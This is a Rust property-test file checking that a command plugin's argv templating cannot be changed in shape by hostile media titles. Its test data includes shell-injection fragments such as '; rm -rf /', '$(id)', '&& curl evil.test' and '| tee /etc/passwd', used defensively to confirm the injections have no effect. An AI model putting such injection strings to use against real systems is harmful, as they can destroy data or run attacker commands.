//! The property that makes `command` plugins safe to ship: **a hostile title cannot add an argv
//! element** (DESIGN §6.5.1, PLAN WP-10).
//!
//! Substitution is argv-level, so the argv a plugin is executed with has the same *length* and the
//! same *shape* no matter what the entry's title, URL, state or playlist metadata contain. That is
//! a structural guarantee rather than an escaping one: there is no shell to escape for, and
//! `execvp` receives the elements verbatim. The `proptest` below asserts it over deliberately
//! hostile titles — quotes, semicolons, newlines, backticks, `$(…)`, NUL-adjacent control
//! characters and very long strings.

#![allow(clippy::unwrap_used, clippy::expect_used)]

use std::path::PathBuf;

use aulos_provider::command::{Template, TemplateCtx, TokenScope, render_argv};
use proptest::prelude::*;
use url::Url;

fn argv() -> Vec<Template> {
    [
        "/usr/bin/dl",
        "--url",
        "{url}",
        "--title",
        "{title}",
        "--out",
        "{out_path}",
        "--state",
        "{state}",
        // Two tokens in one element, and a token embedded in literal text: still one element.
        "--tag={title}:{media_id}",
        "{headers_curl}",
    ]
    .iter()
    .map(|s| Template::parse(s, TokenScope::Provider).expect("a valid template"))
    .collect()
}

fn ctx(title: &str) -> TemplateCtx {
    TemplateCtx {
        url: Some(Url::parse("https://example.test/watch/1").unwrap()),
        media_id: "m1".into(),
        title: title.to_owned(),
        out_dir: PathBuf::from("/downloads"),
        out_name: title.replace('/', "_"),
        output_ext: "mp4".into(),
        state: serde_json::json!({ "k": title }),
        headers: vec![("Referer".into(), "https://example.test/".into())],
        ..TemplateCtx::default()
    }
}

/// Titles chosen to break a shell-based implementation.
fn hostile_titles() -> impl Strategy<Value = String> {
    prop_oneof![
        // Anything at all, including control characters.
        any::<String>(),
        // Shell metacharacters, assembled from the pieces an attacker would reach for.
        proptest::collection::vec(
            prop_oneof![
                Just("; rm -rf /".to_owned()),
                Just("$(id)".to_owned()),
                Just("`id`".to_owned()),
                Just("&& curl evil.test".to_owned()),
                Just("| tee /etc/passwd".to_owned()),
                Just("\"".to_owned()),
                Just("'".to_owned()),
                Just("\\".to_owned()),
                Just("\n".to_owned()),
                Just("\r".to_owned()),
                Just("\t".to_owned()),
                Just("--out".to_owned()),
                Just("-".to_owned()),
                Just("{url}".to_owned()),
                Just("{{".to_owned()),
                Just("../..".to_owned()),
                Just("\u{202e}".to_owned()),
                Just("😈".to_owned()),
            ],
            0..12
        )
        .prop_map(|parts| parts.concat()),
        // Very long, to catch anything that reallocates or truncates into a new element.
        Just("A".repeat(10_000)),
    ]
}

proptest! {
    /// The argv length is invariant under the title: ten fixed elements plus the two the
    /// manifest's single `[headers]` entry expands `{headers_curl}` into. `{headers_curl}` is the
    /// **only** token that changes the count, and what it expands to depends on the manifest, not
    /// on the entry.
    #[test]
    fn a_hostile_title_cannot_change_the_argv_shape(title in hostile_titles()) {
        let templates = argv();
        let rendered = render_argv(&templates, &ctx(&title)).expect("rendering cannot fail");

        prop_assert_eq!(rendered.len(), 12, "argv length must not depend on the title");
        // The fixed elements are exactly where the manifest put them.
        prop_assert_eq!(&rendered[0], "/usr/bin/dl");
        prop_assert_eq!(&rendered[1], "--url");
        prop_assert_eq!(&rendered[2], "https://example.test/watch/1");
        prop_assert_eq!(&rendered[3], "--title");
        prop_assert_eq!(&rendered[5], "--out");
        prop_assert_eq!(&rendered[7], "--state");
        prop_assert_eq!(&rendered[10], "-H");
        prop_assert_eq!(&rendered[11], "Referer: https://example.test/");
        // The title lands in exactly one element, verbatim — no escaping, no splitting.
        prop_assert_eq!(&rendered[4], &title);
        // …and in the composite element, still as one piece.
        prop_assert_eq!(rendered[9].clone(), format!("--tag={title}:m1"));
        // `{state}` is compact JSON, so a hostile title inside it stays inside a JSON string.
        let state: serde_json::Value = serde_json::from_str(&rendered[8])
            .expect("`{state}` is always parseable JSON");
        prop_assert_eq!(state["k"].as_str(), Some(title.as_str()));
    }

    /// Rendering is total for every token in the table: no title makes it fail.
    #[test]
    fn rendering_never_fails_on_a_hostile_title(title in hostile_titles()) {
        let c = ctx(&title);
        for token in aulos_provider::command::Token::ALL {
            let template = Template::parse(&format!("{{{}}}", token.name()), TokenScope::Provider)
                .ok();
            let Some(template) = template else { continue };
            prop_assert!(template.render(&c).is_ok(), "{token} must render");
        }
    }
}

#[test]
fn the_state_element_is_valid_json_whatever_the_title_contains() {
    for title in [
        "\"; rm -rf /",
        "a\\b\"c",
        "line\nbreak",
        "\u{0}\u{1}\u{7f}",
        "😈",
    ] {
        let templates = argv();
        let rendered = render_argv(&templates, &ctx(title)).unwrap();
        let state: serde_json::Value =
            serde_json::from_str(&rendered[8]).expect("`{state}` is always parseable JSON");
        assert_eq!(state["k"], title);
    }
}

#[test]
fn a_manifest_with_no_headers_contributes_no_argv_elements() {
    let templates = argv();
    let mut c = ctx("plain");
    c.headers.clear();
    let rendered = render_argv(&templates, &c).unwrap();
    assert_eq!(rendered.len(), 10, "{rendered:?}");
    assert_eq!(&rendered[9], "--tag=plain:m1");
}
